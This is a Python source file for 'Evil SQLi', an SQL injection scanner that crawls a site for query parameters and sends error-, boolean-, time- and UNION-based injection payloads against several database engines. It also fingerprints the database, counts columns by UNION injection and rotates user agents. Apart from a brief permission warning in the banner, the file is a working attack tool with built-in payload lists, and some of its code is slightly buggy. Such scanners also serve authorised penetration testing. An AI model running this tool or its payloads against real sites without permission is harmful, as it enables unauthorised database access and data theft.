#!/usr/bin/env python3
import os
import random 
import string
import re
import json
import time
import difflib
import logging
import sys
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup

def Symbol():
    print("\n")
    import pyfiglet

    text = "Evil SQLi"
    ascii_art = pyfiglet.figlet_format(text, font="graffiti", width=200, justify="left")

    warning1 = "[!] WARNING: This tool should only be used on systems you own or have explicit permission to test."
    warning2 = "[!] Unauthorized testing is illegal and unethical."
    
    colors_hex = [
        "#FF0000",  # red
        "#FF4500",  # orange-red
        "#FF6347",  # tomato
        "#FF1493",  # deep pink
        "#6A0DAD",  # deep purple
        "#8A2BE2",  # blue violet
        "#0ABDE3",  # electric blue
        "#00BFFF",  # deep sky blue
        "#00FF7F",  # spring green
        "#00FFC6",  # teal
        "#00FF00",  # green
        "#32CD32",  # lime green
        "#3A0071",  # indigo
        "#8B008B",  # dark magenta
    ]

    def hex_to_rgb(h):
        h = h.lstrip("#")
        return tuple(int(h[i:i+2], 16) for i in (0, 2, 4))

    colors = [hex_to_rgb(c) for c in colors_hex]

    def lerp(color1, color2, t):
        return tuple(int(c1 + (c2 - c1) * t) for c1, c2 in zip(color1, color2))

    def get_cosmic_color(pos):
        if pos <= 0:
            return colors[0]
        if pos >= 1:
            return colors[-1]
        segment_len = 1 / (len(colors) - 1)
        segment_index = int(pos / segment_len)
        t = (pos - segment_len * segment_index) / segment_len
        return lerp(colors[segment_index], colors[segment_index + 1], t)
    
    visible_chars = [c for c in ascii_art if c not in [" ", "\n"]]
    total_visible = len(visible_chars)

    def rgb_escape(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"

    output = ""
    char_index = 0
    for char in ascii_art:
        if char == "\n":
            output += "\n"
        elif char == " ":
            output += " "
        else:
            pos = char_index / total_visible
            r, g, b = get_cosmic_color(pos)
            output += rgb_escape(r, g, b) + char
            char_index += 1

    output += "\033[0m"
    print(output)
    
    red_color = "\033[38;2;255;0;0m"
    reset_color = "\033[0m"
    terminal_width = 200
    print(f"{red_color}{warning1}{reset_color}")
    print(f"{red_color}{warning2}{reset_color}")
    print("\033[0m")

@dataclass
class Config:
    timeout: int = 10
    delay: float = 0.5
    max_depth: int = 2
    union_max_cols: int = 20
    time_based_threshold: float = 4.0
    similaity_threshold: float = 0.92
    use_cookies: bool = True

# ----------------------------
# Console Colors Method
# ----------------------------
class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD_GREEN = "\033[1;92m"
    CYAN = "\033[96m"
    RESET = "\033[0m"

# ----------------------------
# Message Color Control
# ----------------------------
def info(msg: str) -> None:
    print(f"{Colors.GREEN}[*] {msg}{Colors.RESET}")

def warn(msg: str) -> None:
    print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")

def error(msg: str) -> None:
    print(f"{Colors.RED}[-] {msg}{Colors.RESET}")

def good(msg: str) -> None:
    print(f"{Colors.BOLD_GREEN}[+] {msg}{Colors.RESET}")

def diag(msg: str) -> None:
    print(f"{Colors.CYAN}[*] {msg}{Colors.RESET}")
    
# ----------------------------
# Utility Helpers
# ----------------------------
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def load_lines(filename: str) -> List[str]:
    path = os.path.join(SCRIPT_DIR, filename)
    if not os.path.exists(path):
        warn(f"File not found: {filename}. Using empty list.")
        return []
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]

def domain_folder(target_url: str) -> str:
    domain = urlparse(target_url).netloc or target_url.replace("://", "_")
    folder = os.path.join(SCRIPT_DIR, domain)
    os.makedirs(folder, exist_ok=True)
    return folder

def save_text(folder: str, name: str, lines: List[str]) -> None:
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        for ln in lines:
            f.write(ln + "\n")
    info(f"Saved: {path}")

def save_json(folder: str, name: str, obj: dict) -> None:
    path = os.path.join(folder, name)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)
    info(f"Saved: {path}")

def same_domain(a: str, b: str) -> bool:
    return urlparse(a).netloc == urlparse(b).netloc

def normalize_url(u: str) -> str:
    pr = urlparse(u)
    qs = parse_qs(pr.query, keep_blank_values=True)
    sorted_qs = urlencode({k: v[0] if v else "" for k, v in sorted(qs.items())})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, sorted_qs, ""))

# ----------------------------
# HTTP Client
# ----------------------------
USER_AGENTS = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.43",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]

DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

class HttpClient:
    def __init__(self, timeout: int = 10, delay: float = 0.5, use_cookies: bool = True):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.use_cookies = use_cookies

        if not use_cookies:
            self.session.cookies.clear()

    def get(self, url: str) -> Optional[requests.Response]:
        time.sleep(self.delay)

        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)

        try:
            response = self.session.get(
                url, headers=headers, timeout=self.timeout, allow_redirects=True
            )
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            if e.response is not None and e.response.status_code == 403:
                warn(f"Access denied (403) for {url} — try adjusting headers or cookies")
            else:
                error(f"HTTP Error: {e} for {url}")
        except requests.exceptions.Timeout:
            error(f"Timeout occurred for {url}")
        except requests.exceptions.RequestException as e:
            error(f"Request failed: {url} ({e})")
        return None

# ----------------------------
# Crawling
# ----------------------------
@dataclass
class CrawlResult:
    url: str
    params: List[str] = field(default_factory=list)

class Crawler:
    def __init__(self, base_url: str, depth: int = 2, client: Optional[HttpClient] = None):
        self.base_url = base_url.rstrip("/")
        self.depth = max(1, depth)
        self.client = client or HttpClient()
        self.visited: Set[str] = set()
        self.endpoints: Dict[str, Set[str]] = {}

    def run(self) -> List[CrawlResult]:
        info(f"Starting crawl on: {self.base_url}")
        self._crawl(self.base_url, self.depth)
        results: List[CrawlResult] = []
        for u, params in self.endpoints.items():
            results.append(CrawlResult(u, sorted(list(params))))
        return results

    def _crawl(self, url: str, depth: int) -> None:
        url = normalize_url(url)
        if depth <= 0 or url in self.visited:
            return
        self.visited.add(url)
        resp = self.client.get(url)
        if not resp or "text/html" not in resp.headers.get("Content-Type", ""):
            return
        soup = BeautifulSoup(resp.text, "html.parser")
        
        pr = urlparse(url)
        if pr.query:
            params = list(parse_qs(pr.query, keep_blank_values=True).keys())
            self.endpoints.setdefault(url, set()).update(params)
            info(f"Found endpoint: {url} -> {params}")
            
        for a in soup.find_all("a", href=True):
            href = a["href"]
            if "?" in href:
                nxt = urljoin(url, href)
                if same_domain(nxt, self.base_url):
                    link_pr = urlparse(nxt)
                    if link_pr.query:
                        link_params = list(parse_qs(link_pr.query, keep_blank_values=True).keys())
                        self.endpoints.setdefault(nxt, set()).update(link_params)
                        info(f"Found link endpoint: {nxt} -> {link_params}")
                    
                    self._crawl(nxt, depth - 1)
                
            else:
                nxt = urljoin(url, href)
                if same_domain(nxt, self.base_url):
                    self._crawl(nxt, depth - 1)

# ----------------------------
# SQLi Detection & Payloads
# ----------------------------
DBMS_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "mysql_num_rows",
        "mysqli",
        "for the right syntax to use",
    ],
    "PostgreSQL": ["pg_query", "pg_connect", "postgresql", "psql:"],
    "MSSQL": [
        "microsoft odbc",
        "sql server",
        "oledbexception",
        "mssql",
        "unclosed quotation mark after the character string",
    ],
    "Oracle": ["ora-", "oracle error", "quoted string not properly terminated"],
    "SQLite": ["sqlite error", "sql logic error", "sqlite3"],
}

DBMS_SPECIFIC_PAYLOADS = {
    "MySQL": {
        "error_based": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))-- -", 
                       "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "time_based": ["' AND SLEEP(5)-- -", 
                      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"],
        "boolean_based": ["' OR 1=1-- -", 
                         "' OR 'a'='a'"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "PostgreSQL": {
        "error_based": ["' AND CAST((SELECT version()) AS INTEGER)-- -",
                       "' AND 1=CAST((SELECT version()) AS INTEGER)-- -"],
        "time_based": ["' AND (SELECT pg_sleep(5))-- -",
                      "' AND 123=(SELECT 123 FROM pg_sleep(5))-- -"],
        "boolean_based": ["' OR '1'='1'-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "MSSQL": {
        "error_based": ["' AND 1=CONVERT(INT,(SELECT @@version))-- -",
                       "' AND 1=@@version-- -"],
        "time_based": ["' WAITFOR DELAY '0:0:5'-- -",
                      "' IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:5'-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Oracle": {
        "error_based": ["' AND (SELECT * FROM (SELECT CTXSYS.DRITHSX.SN(1,(SELECT version FROM v$instance)) FROM dual)) IS NOT NULL-- -"],
        "time_based": ["' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0)>0-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL FROM dual-- -"]
    },
    "SQLite": {
        "error_based": ["' AND load_extension('nonexistent')-- -"],
        "time_based": ["' AND (SELECT randomblob(1000000000))-- -"],
        "boolean_based": ["' OR 1=1-- -"],
        "union_based": ["' UNION SELECT NULL,NULL,NULL-- -"]
    },
    "Generic": {
        "error_based": ["'", "''", "`", "``", "\"", "\"\""],
        "time_based": ["' AND 1=0-- -", "' OR IF(1=1,SLEEP(5),0)-- -"],
        "boolean_based": ["' OR '1'='1'", "' OR '1'='0'", "OR 1=1", "OR 1=0"],
        "union_based": ["' UNION SELECT NULL-- -", "' UNION ALL SELECT NULL-- -"]
    }
}

def detect_dbms(html_lower: str) -> Optional[str]:
    for db, sigs in DBMS_SIGNATURES.items():
        for s in sigs:
            if s in html_lower:
                return db
    return None

def apply_payload_to_url(url: str, param: str, payload: str) -> str:
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    if param in qs:
        cur = qs[param][0] if qs[param] else ""
        qs[param] = [cur + payload]
    new_query = urlencode({k: v[0] if v else "" for k, v in qs.items()})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, new_query, ""))

@dataclass
class Finding:
    url: str
    param: str
    technique: str
    payload: str
    dbms: Optional[str] = None
    severity: str = "Unknown"
    confidence: float = 0.0
    columns: Optional[int] = None
    
    def to_dict(self):
        return{
            "url":self.url,
            "param":self.param,
            "technique":self.technique,
            "payload":self.payload,
            "dbms":self.dbms,
            "severity":self.severity,
            "confidence":self.confidence,
            "columns":self.columns,
        }

class Scanner:
    def __init__(self, client: Optional[HttpClient] = None):
        self.client = client or HttpClient(timeout=10)
        self.findings: List[Finding] = []
        self.enumerated: Set[Tuple[str, str]] = set()
        
    def _calculate_severity(self, technique: str, dbms: Optional[str] = None) -> str:
        severity_map = {
            "Union-Based": "High",
            "Error-Based": "High", 
            "Time-Based": "Medium",
            "Boolean-Based": "Medium"
        }
        
        severity = severity_map.get(technique, "High")
        
        if dbms in ["Oracle", "MSSQL"] and severity == "High":
            severity = "Critical"
        elif dbms in ["MySQL", "PostgreSQL"] and severity == "High":
            severity = "High"
        
        return severity

    def _calculate_confidence(self, technique: str) -> float:
        confidence_map = {
            "Union-Based": 0.95,
            "Error-Based": 0.90,
            "Time-Based": 0.85, 
            "Boolean-Based": 0.80
        }
        return confidence_map.get(technique, 0.75)
    
    def fingerprint_dbms(self, url: str, param: str) -> Optional[str]:
        fingerprint_payloads = {
            "MySQL": [
                ("' AND SLEEP(5)-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT 'test' RLIKE '^t')-- -", "function"),
            ],
            "PostgreSQL": [
                ("' AND (SELECT pg_sleep(5))-- -", "time"),
                ("' AND (SELECT version())-- -", "function"),
                ("' AND (SELECT 'test' ~ '^t')-- -", "function"),
            ],
            "MSSQL": [
                ("'; WAITFOR DELAY '0:0:5'-- -", "time"),
                ("' AND (SELECT @@version)-- -", "function"),
                ("' AND (SELECT CHAR(65))-- -", "function"),
            ],
            "Oracle": [
                ("' AND (SELECT DBMS_LOCK.SLEEP(5) FROM DUAL)-- -", "time"),
                ("' AND (SELECT banner FROM v$version WHERE rownum=1)-- -", "function"),
                ("' AND (SELECT CHR(65) FROM DUAL)-- -", "function"),
            ],
            "SQLite": [
                ("' AND (SELECT randomblob(1000000000))-- -", "time"),
                ("' AND (SELECT sqlite_version())-- -", "function"),
                ("' AND (SELECT hex('A'))-- -", "function"),
            ]
        }
        
        baseline_time = self._avg_elapsed(url, n=2)
        
        for dbms, payloads in fingerprint_payloads.items():
            for payload, technique in payloads:
                test_url = apply_payload_to_url(url, param, payload)
                
                if technique == "time":
                    start_time = time.time()
                    resp = self.client.get(test_url)
                    elapsed = time.time() - start_time
                    
                    if resp and elapsed >= 4.0:
                        return dbms
                else:
                    resp = self.client.get(test_url)
                    if resp and resp.status_code < 500:
                        confirm_payload = payload.replace("5", "2") if "SLEEP" in payload or "DELAY" in payload else payload
                        confirm_url = apply_payload_to_url(url, param, confirm_payload)
                        confirm_resp = self.client.get(confirm_url)
                        
                        if confirm_resp and confirm_resp.status_code < 500:
                            return dbms
        return None

    def _is_blocked(self, html: str) -> bool:
        BLOCK_INDICATORS = ["Cloudflare", "CAPTCHA", "Access Denied", "Security Block"]
        return any(indicator in html for indicator in BLOCK_INDICATORS)

    def _avg_elapsed(self, url: str, n: int = 2) -> float:
        times = []
        for _ in range(n):
            t0 = time.time()
            _ = self.client.get(url)
            times.append(time.time() - t0)
            time.sleep(0.2)
        return sum(times) / len(times) if times else 0.0

    def check_error_based(self, base_html: str, test_html: str) -> Tuple[bool, Optional[str]]:
        test_lower = test_html.lower()
        external_errors = load_lines("sql_errors.txt")
        for e in external_errors:
            if e.lower() in test_lower:
                return True, detect_dbms(test_lower)
        db = detect_dbms(test_lower)
        return (db is not None), db

    def check_boolean_based_similarity(self, true_html: str, false_html: str, threshold: float = 0.92) -> bool:
        if not (true_html and false_html):
            return False
        a = re.sub(r"\s+", " ", true_html)
        b = re.sub(r"\s+", " ", false_html)
        return self._similarity_ratio(a, b) < threshold

    def check_time_based(self, elapsed_sec: float, threshold: float = 4.0) -> bool:
        return elapsed_sec >= threshold

    def _similarity_ratio(self, a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _rand_token(self, n=8) -> str:
        return "X" + "".join(random.choices(string.ascii_uppercase + string.digits, k=n)) + "X"

    def _determine_column_count(self, url: str, param: str, max_cols: int = 8) -> Optional[int]:
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            return None

        for cols in range(1, max_cols + 1):
            for pos in range(cols):
                vals = ["NULL"] * cols
                token = self._rand_token(6)
                vals[pos] = f"'{token}'"
                payload = " -1 UNION SELECT " + ",".join(vals)
                test_url = apply_payload_to_url(url, param, payload)
                resp = self.client.get(test_url)

                if resp and token in resp.text:
                    good(f"Column count confirmed via UNION-based injection: {cols}")
                    return cols

        warn(f"Could not determine column count up to {max_cols} columns for parameter '{param}'")
        return None


    def _try_union_probe(self, url: str, param: str, dbms: Optional[str] = None) -> Optional[Finding]:
        cols = self._determine_column_count(url, param, max_cols=20)
        if not cols:
            return None

        good(f"Union-Based SQLi possible with {cols} columns on parameter '{param}'")

        token = self._rand_token(10)
        vals = ["NULL"] * cols

        if dbms == "PostgreSQL":
            vals[0] = f"'{token}'"
        elif dbms == "Oracle":
            vals[0] = f"'{token}' FROM dual"
        elif dbms == "MSSQL":
            vals[0] = f"'{token}'"
        else:
            vals[0] = f"'{token}'"

        payload = " -1 UNION SELECT " + ",".join(vals)
        test_url = apply_payload_to_url(url, param, payload)
        resp = self.client.get(test_url)

        if resp and token in resp.text:
            good(f"Confirmed Union-Based SQLi on {param} (cols={cols})")
            severity = self._calculate_severity("Union-Based", dbms)
            confidence = self._calculate_confidence("Union-Based")
            return Finding(url, param, "Union-Based", payload, dbms, severity, confidence, columns=cols)

        warn(f"Union-based SQLi not confirmed for '{param}' despite detecting {cols} columns")
        return None

    def scan_param(self, url: str, param: str, payloads: List[str], folder: str) -> Optional[Finding]:
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            return None
        baseline_html = baseline_resp.text
        dbms = detect_dbms(baseline_html.lower()) if baseline_html else None
        selected_payloads = []
        
        if dbms and dbms in DBMS_SPECIFIC_PAYLOADS:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["union_based"])
        else:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["union_based"])

        selected_payloads.extend(payloads)
        
        if dbms is None:
            dbms = self.fingerprint_dbms(url, param)
            if dbms:
                info(f"Fingerprinted DBMS: {dbms} for parameter '{param}'")
        
        if self._is_blocked(baseline_html):
            warn(f"Request blocked (WAF/CAPTCHA) for {url}")
            return None

        benign_payload = "12345"
        benign_url = apply_payload_to_url(url, param, benign_payload)
        baseline_lengths, benign_lengths = [], []
        for _ in range(3):
            br = self.client.get(url)
            tr = self.client.get(benign_url)
            if br: baseline_lengths.append(len(br.text))
            if tr: benign_lengths.append(len(tr.text))
            time.sleep(0.2)
            
        if baseline_lengths and benign_lengths:
            baseline_len = sorted(baseline_lengths)[len(baseline_lengths)//2]
            benign_len = sorted(benign_lengths)[len(benign_lengths)//2]
            diff_ratio = abs(benign_len - baseline_len) / max(1, baseline_len)
            if diff_ratio > 0.30:
                warn(f"Parameter {param} appears unstable (diff {diff_ratio:.2f}), continuing with caution")
        else:
            warn(f"Stability sampling incomplete for {param}, continuing with tests")

        try:
            pr = urlparse(url)
            qs = parse_qs(pr.query, keep_blank_values=True)
            original_val = qs.get(param, [""])
            numeric_like = re.fullmatch(r"-?\d+", original_val.strip()) is not None
        except Exception:
            numeric_like = False

        if numeric_like:
            uf = self._try_union_probe(url, param, dbms)
            if uf:
                return uf

        if dbms and dbms in DBMS_SPECIFIC_PAYLOADS:
            true_payload = DBMS_SPECIFIC_PAYLOADS[dbms]["boolean_based"][0]
            false_payload = " AND 1=2"
        else:    
            true_payload = " OR 1=1-- -"
            false_payload = " AND 1=2-- -"
        true_url = apply_payload_to_url(url, param, true_payload)
        false_url = apply_payload_to_url(url, param, false_payload)
        true_resp = self.client.get(true_url)
        false_resp = self.client.get(false_url)
        if true_resp and false_resp and self.check_boolean_based_similarity(true_resp.text, false_resp.text):
            good(f"Confirmed Boolean-Based SQLi on {param}")
            severity = self._calculate_severity("Boolean-Based", dbms)
            confidence = self._calculate_confidence("Boolean-Based")
            finding = Finding(url, param, "Boolean-Based", true_payload, dbms, severity, confidence)
            cols = self._determine_column_count(url, param, max_cols=20)
            
            if cols:
                finding.columns = cols
                good(f"Cross-check confirmed column count = {cols} for parameter '{param}'")
            return finding

        baseline_avg = self._avg_elapsed(url, n=2)
        delay = int(self.client.delay) if hasattr(self.client, "delay") else 5
        time_based_payloads = {
            "MySQL": f"' AND SLEEP({delay})-- -",
            "PostgreSQL": f"' AND (SELECT pg_sleep({delay}))-- -",
            "MSSQL": f"'; WAITFOR DELAY '0:0:{delay}'-- -",
            "Oracle": f"' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=0)>0-- -"
        }
        
        for dbms_candidate, payload_template in time_based_payloads.items():
            for delay in [5, 8]:
                tb_payload = payload_template.format(delay=delay)
                tb_url = apply_payload_to_url(url, param, tb_payload)
                t0 = time.time()
                tb_resp = self.client.get(tb_url)
                elapsed = time.time() - t0
                
                if tb_resp and (elapsed - baseline_avg) >= (delay - 1.0):
                    confirm_delay = delay + 2
                    confirm_payload = payload_template.format(delay=confirm_delay)
                    confirm_url = apply_payload_to_url(url, param, confirm_payload)
                    t1 = time.time()
                    confirm_resp = self.client.get(confirm_url)
                    confirm_elapsed = time.time() - t1
                    
                    if confirm_resp and (confirm_elapsed - baseline_avg) >= (confirm_delay - 1.0):
                        dbms = dbms_candidate
                        good(f"Confirmed Time-Based SQLi on {param} with DBMS: {dbms}")
                        severity = self._calculate_severity("Time-Based", dbms)
                        confidence = self._calculate_confidence("Time-Based")
                        finding = Finding(url, param, "Time-Based", tb_payload, dbms, severity, confidence)
       
                        cols = self._determine_column_count(url, param, max_cols=20)
                        if cols:
                            finding.columns = cols
                            good(f"Determined column count = {cols} for parameter '{param}' (secondary check)")
                        return finding
                    
        print(f"{Colors.CYAN}[*]{Colors.RESET} Checking Payloads -->{Colors.RESET}")
        for payload in payloads:
            test_url = apply_payload_to_url(url, param, payload)
            resp = self.client.get(test_url)
            if not resp:
                continue
            if self.check_error_based(baseline_html, resp.text)[0]:
                confirm_payload = payload.replace("1=1", "9=9")
                confirm_url = apply_payload_to_url(url, param, confirm_payload)
                confirm_resp = self.client.get(confirm_url)
                if confirm_resp and self.check_error_based(baseline_html, confirm_resp.text)[0]:
                    dbms = detect_dbms(resp.text.lower())
                    good(f"Confirmed Error-Based SQLi on {param} | DBMS: {dbms or 'Unknown'}")
                    severity = self._calculate_severity("Error-Based", dbms)
                    confidence = self._calculate_confidence("Error-Based")
                    finding = Finding(url, param, "Error-Based", payload, dbms, severity, confidence)

                    cols = self._determine_column_count(url, param, max_cols=20)
                    if cols:
                        finding.columns = cols
                        good(f"Determined column count = {cols} for parameter '{param}' (secondary check)")
                    return finding

        warn(f"No SQLi confirmed for parameter '{param}'")
        return None

# ----------------------------
# Orchestration
# ----------------------------
class App:
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.client = HttpClient(timeout=self.config.timeout, delay=self.config.delay, use_cookies=self.config.use_cookies)
        self.scanner = Scanner(self.client)

    def _setup_logging(self, verbose: bool) -> None:
        level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(SCRIPT_DIR, 'sqli_scanner.log')),
                logging.StreamHandler()
            ]
        )

    def run(self, args_list=None) -> None:
        
        import argparse
        parser = argparse.ArgumentParser(
            description=(
                "Evil SQLi\n"
                "SQL Injection Scanner\n"
                "--------------------------------------------------\n"
                "Supports crawling websites to discover parameters\n"
                "and scanning for multiple SQLi techniques:\n"
                "  - Error-Based\n"
                "  - Boolean-Based\n"
                "  - Time-Based\n"
                "  - Union-Based\n"
                "--------------------------------------------------"
            ),
            formatter_class=argparse.RawTextHelpFormatter,
            epilog=(
                "Examples:\n"
                "  python Evil_SQLi.py -u https://example.com --mode crawl --depth 3\n"
                "  python Evil_SQLi.py -u https://target.com/page.php?id=1 --mode scan\n"
                "  python Evil_SQLi.py -u https://site.com --depth 4 --timeout 15 --delay 1.0\n"
                "  python Evil_SQLi.py -u https://demo.com --mode scan --no-cookies --verbose\n"
                "  python Evil_SQLi.py -u https://test.com --mode scan --output results_folder\n"
            )
        )
        parser.add_argument(
            '-u', '--url',
            required=True,
            help='Target URL to scan'
        )
        parser.add_argument(
            '--mode',
            choices=['crawl', 'scan'],
            default='scan',
            help=(
                "Operation mode:\n"
                "  crawl -> discover URLs and parameters only\n"
                "  scan  -> discover and actively test for SQL injection vulnerabilities"
            )
        )
        parser.add_argument(
            '--depth',
            type=int,
            default=2,
            help='Crawl depth (default: 2)'
        )
        parser.add_argument(
            '--delay',
            type=float,
            default=0.5,
            help='Delay between HTTP requests in seconds (default: 0.5)'
        )
        parser.add_argument(
            '--timeout',
            type=int,
            default=10,
            help='Request timeout in seconds (default: 10)'
        )
        parser.add_argument(
            '--no-cookies',
            action='store_true',
            help='Disable cookies and do not maintain session state'
        )
        parser.add_argument(
            '--verbose',
            action='store_true',
            help='Enable verbose logging (prints debug info)'
        )
        parser.add_argument(
            '--output',
            type=str,
            default=None,
            help='Custom output directory (default: domain-based folder in script directory)'
        )

        args = parser.parse_args(args_list)
        
        self._setup_logging(args.verbose)
        
        self.client = HttpClient(timeout=args.timeout, delay=args.delay, use_cookies=not args.no_cookies)
        self.scanner = Scanner(self.client)
        
        folder = domain_folder(args.url)
        if args.output:
            folder = os.path.join(SCRIPT_DIR, args.output)
            os.makedirs(folder, exist_ok=True)
        
        if args.mode == 'crawl':
            info(f"Starting crawl on {args.url} with depth {args.depth}")
            self.do_crawl(args.url, args.depth, folder=folder)
        elif args.mode == 'scan':
            info(f"Starting scan on {args.url} with depth {args.depth}")
            self.do_scan(args.url, args.depth, folder=folder)

    def do_crawl(self, target: str, depth: int, folder: str) -> None:
        crawler = Crawler(target, depth=depth, client=self.client)
        results = crawler.run()
        lines = [f"{r.url} -> {r.params}" for r in results]
        save_text(folder, "crawl_result.txt", lines)

    def do_scan(self, target: str, depth: int, folder: str) -> None:
        parsed = urlparse(target)
        if parsed.query and parse_qs(parsed.query):
            params = list(parse_qs(parsed.query).keys())
            endpoints = [CrawlResult(target, params)]
            info(f"Scanning provided URL directly with parameters: {params}")
        else:
            crawler = Crawler(target, depth=depth, client=self.client)
            endpoints = crawler.run()
            if not endpoints:
                warn("No endpoints with query parameters discovered during crawl.")

        payloads = load_lines("payloads.txt")
        if not payloads:
            error("Missing payloads.txt! Scanner will use built-in payloads only.")

        errors = load_lines("sql_errors.txt")
        if not errors:
            warn("sql_errors.txt is empty or missing. Relying on DBMS heuristics.")

        for ep in endpoints:
            if not ep.params:
                continue
            info(f"Testing URL: {ep.url}")
            for p in ep.params:
                info(f"Testing parameter: {p}")
                finding = self.scanner.scan_param(ep.url, p, payloads, folder)
                if finding:
                    self.scanner.findings.append(finding)

        lines = [
            f"{f.technique} | url={f.url} | param={f.param} | payload={f.payload} | dbms={f.dbms or ''} "
            f"| severity={f.severity} | confidence={f.confidence} | columns={f.columns if f.columns else ''}"
            for f in self.scanner.findings
        ]

        if lines:
            save_text(folder, "scan_result.txt", lines)
            save_json(
                folder,
                "scan_result.json",
                {"target": target, "findings": [f.to_dict() for f in self.scanner.findings]},
            )
        else:
            warn("No confirmed SQLi findings. Nothing to save.")

# ----------------------------
# Main Execution
# ----------------------------
if __name__ == "__main__":
    Symbol()
    try:
        App().run(sys.argv[1:])
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user.")